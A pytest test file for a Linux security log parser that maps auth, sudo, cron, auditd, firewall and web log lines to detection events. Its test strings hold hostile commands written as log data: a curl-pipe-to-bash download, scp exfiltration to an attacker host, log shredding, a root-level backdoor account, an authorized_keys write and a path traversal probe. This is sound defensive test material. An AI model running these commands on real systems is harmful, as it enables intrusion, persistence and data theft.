import pytest
import json
from pathlib import Path
from aegis_agent.linux_parser import LinuxTelemetryParser
from aegis_agent.schemas import LogEventInput


@pytest.fixture
def parser():
    return LinuxTelemetryParser(default_year=2026)


@pytest.fixture
def fixtures_data():
    fixture_path = Path(__file__).resolve().parent.parent / "evaluation" / "datasets" / "synthetic_linux_logs.json"
    with open(fixture_path, "r", encoding="utf-8") as f:
        return json.load(f)


def test_parse_sshd_failed_password(parser, fixtures_data):
    raw = fixtures_data[0]["raw_line"]
    parsed = parser.parse_line(raw)

    assert isinstance(parsed, LogEventInput)
    assert parsed.event_type == "auth_failure"
    assert parsed.source_ip == "198.51.100.24"
    assert parsed.user == "admin"
    assert parsed.details["reason"] == "invalid_password"
    assert parsed.details["source_port"] == 54321
    assert "2026-11-01" in parsed.timestamp


def test_parse_sshd_accepted_password(parser, fixtures_data):
    raw = fixtures_data[2]["raw_line"]
    parsed = parser.parse_line(raw)

    assert isinstance(parsed, LogEventInput)
    assert parsed.event_type == "auth_success"
    assert parsed.source_ip == "198.51.100.24"
    assert parsed.user == "admin"
    assert parsed.details["auth_method"] == "password"
    assert parsed.details["source_port"] == 54330


def test_parse_pam_session(parser, fixtures_data):
    raw = fixtures_data[3]["raw_line"]
    parsed = parser.parse_line(raw)

    assert isinstance(parsed, LogEventInput)
    assert parsed.event_type == "session_opened"
    assert parsed.user == "admin"
    assert parsed.details["service"] == "pam_unix"


def test_parse_auditd_syscall(parser, fixtures_data):
    raw = fixtures_data[4]["raw_line"]
    parsed = parser.parse_line(raw)

    assert isinstance(parsed, LogEventInput)
    assert parsed.event_type == "process_execution"
    assert parsed.details["process_name"] == "curl"
    assert parsed.details["executable"] == "/usr/bin/curl"
    assert parsed.details["pid"] == 12470
    assert parsed.timestamp is not None


def test_parse_auditd_execve_cmdline(parser, fixtures_data):
    raw = fixtures_data[5]["raw_line"]
    parsed = parser.parse_line(raw)

    assert isinstance(parsed, LogEventInput)
    assert parsed.event_type == "process_cmdline"
    assert "curl -s http://198.51.100.24/stage2.sh" in parsed.details["command_line"]


def test_parse_sudo_execution(parser):
    raw = "Nov 07 15:03:24 fenn sudo[12413]:   ubuntu : PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/journalctl -u aegis-collector"
    parsed = parser.parse_line(raw)

    assert isinstance(parsed, LogEventInput)
    assert parsed.event_type == "sudo_execution"
    assert parsed.user == "ubuntu"
    assert parsed.details["target_user"] == "root"
    assert parsed.details["command"] == "/usr/bin/journalctl -u aegis-collector"
    assert parsed.details["service"] == "sudo"


def test_parse_sudo_auth_failure(parser):
    raw = "Nov 07 15:00:00 fenn sudo[1234]: pam_unix(sudo:auth): authentication failure; logname=ubuntu uid=1000 euid=0 tty=/dev/pts/0 ruser=ubuntu rhost= user=ubuntu"
    parsed = parser.parse_line(raw)

    assert isinstance(parsed, LogEventInput)
    assert parsed.event_type == "sudo_auth_failure"
    assert parsed.user == "ubuntu"
    assert parsed.details["reason"] == "authentication_failure"
    assert parsed.details["service"] == "sudo"



def test_parse_network_connection_snapshot(parser, fixtures_data):
    raw = fixtures_data[6]["raw_line"]
    parsed = parser.parse_line(raw)

    assert isinstance(parsed, LogEventInput)
    assert parsed.event_type == "network_connection"
    assert parsed.source_ip == "198.51.100.24"
    assert parsed.details["connection_state"] == "ESTAB"
    assert parsed.details["remote_port"] == 54330


def test_parse_malformed_line_returns_none(parser, fixtures_data):
    raw = fixtures_data[7]["raw_line"]
    parsed = parser.parse_line(raw)
    assert parsed is None


def test_parse_batch_ignores_corrupted(parser, fixtures_data):
    all_lines = [f["raw_line"] for f in fixtures_data]
    batch_results = parser.parse_batch(all_lines)

    # 8 raw lines, 1 malformed -> exactly 7 valid LogEventInput
    assert len(batch_results) == 7
    for ev in batch_results:
        assert isinstance(ev, LogEventInput)
        assert ev.event_id is not None
        assert ev.event_type is not None


def test_invalid_timestamp_graceful_fallback(parser):
    # Log with invalid timestamp format
    broken_ts_log = "InvalidMonth 99 99:99:99 core-auth-srv01 sshd[123]: Failed password for admin from 10.0.0.1 port 22 ssh2"
    parsed = parser.parse_line(broken_ts_log)
    # Does not crash; timestamp is None or fallback
    assert parsed is not None
    assert parsed.timestamp is None
    assert parsed.event_type == "auth_failure"


def test_parse_account_management_logs(parser):
    line_useradd = "Nov 07 16:00:01 fenn useradd[4500]: new user: name=backdoor_admin, UID=0, GID=0, home=/root, shell=/bin/bash"
    ev1 = parser.parse_line(line_useradd)
    assert ev1 is not None
    assert ev1.event_type == "account_created"
    assert ev1.user == "backdoor_admin"
    assert ev1.details["uid"] == "0"

    line_usermod = "Nov 07 16:01:00 fenn usermod[4505]: add 'www-data' to group 'sudo'"
    ev2 = parser.parse_line(line_usermod)
    assert ev2 is not None
    assert ev2.event_type == "privilege_group_added"
    assert ev2.user == "www-data"
    assert ev2.details["group"] == "sudo"


def test_parse_firewall_and_kernel_logs(parser):
    line_ufw = "Nov 07 16:02:10 fenn kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:11 SRC=203.0.113.77 DST=192.168.1.10 LEN=40 PROTO=TCP SPT=51122 DPT=3306 WINDOW=1024"
    ev_ufw = parser.parse_line(line_ufw)
    assert ev_ufw is not None
    assert ev_ufw.event_type == "firewall_block"
    assert ev_ufw.source_ip == "203.0.113.77"
    assert ev_ufw.details["dest_port"] == 3306

    line_segfault = "Nov 07 16:03:00 fenn kernel: nginx[9123]: segfault at 0000000000000008 ip 00007f8b1c in libc.so.6[7f8b1c000+190000]"
    ev_seg = parser.parse_line(line_segfault)
    assert ev_seg is not None
    assert ev_seg.event_type == "kernel_segfault"
    assert ev_seg.details["process_name"] == "nginx"
    assert ev_seg.details["library"] == "libc.so.6"


def test_parse_cron_and_systemd_logs(parser):
    line_cron = "Nov 07 16:04:00 fenn CRON[5001]: (root) CMD (curl -s http://198.51.100.99/shell.sh | bash)"
    ev_cron = parser.parse_line(line_cron)
    assert ev_cron is not None
    assert ev_cron.event_type == "cron_execution"
    assert ev_cron.user == "root"
    assert "curl -s" in ev_cron.details["command"]

    line_systemd = "Nov 07 16:05:00 fenn systemd[1]: ufw.service: Deactivated successfully."
    ev_sys = parser.parse_line(line_systemd)
    assert ev_sys is not None
    assert ev_sys.event_type == "service_stopped"
    assert ev_sys.details["unit"] == "ufw.service"


def test_parse_web_access_log_high_signal_filtering(parser):
    # Normal HTTP 200 static asset is ignored (returns None)
    normal_web = '192.0.2.10 - - [07/Nov/2026:16:06:00 +0000] "GET /assets/logo.png HTTP/1.1" 200 1024 "-" "Mozilla/5.0"'
    assert parser.parse_line(normal_web) is None

    # Path traversal probe is captured
    attack_web = '198.51.100.88 - - [07/Nov/2026:16:06:05 +0000] "GET /../../etc/passwd HTTP/1.1" 404 196 "-" "sqlmap/1.7"'
    ev_web = parser.parse_line(attack_web)
    assert ev_web is not None
    assert ev_web.event_type == "web_attack_probe"
    assert ev_web.source_ip == "198.51.100.88"
    assert ev_web.details["attack_category"] == "path_traversal"


def test_parse_critical_file_tamper_log(parser):
    line_tamper = "Nov 07 16:07:00 fenn sudo[6100]:   ubuntu : PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/tee -a /root/.ssh/authorized_keys"
    ev_tamper = parser.parse_line(line_tamper)
    assert ev_tamper is not None
    assert ev_tamper.event_type == "critical_file_modified"
    assert ev_tamper.user == "ubuntu"
    assert "authorized_keys" in ev_tamper.details["target_file"]


def test_parse_defense_apt_anti_forensics_exfil_and_rootkit(parser):
    line_af = "Nov 07 16:08:00 fenn sudo[6200]:   ubuntu : PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/shred -u /var/log/auth.log"
    ev_af = parser.parse_line(line_af)
    assert ev_af is not None
    assert ev_af.event_type == "anti_forensics_execution"
    assert ev_af.details["technique"] == "T1070"

    line_exf = "Nov 07 16:09:00 fenn sudo[6205]:   ubuntu : PWD=/tmp ; USER=root ; COMMAND=/usr/bin/scp /tmp/etc_backup.tar.gz attacker@198.51.100.77:/tmp/"
    ev_exf = parser.parse_line(line_exf)
    assert ev_exf is not None
    assert ev_exf.event_type == "data_exfiltration_attempt"
    assert ev_exf.source_ip == "198.51.100.77"

    line_rk = "Nov 07 16:10:00 fenn kernel: device eth0 entered promiscuous mode"
    ev_rk = parser.parse_line(line_rk)
    assert ev_rk is not None
    assert ev_rk.event_type == "rootkit_or_sniff_activity"
    assert ev_rk.details["interface"] == "eth0"



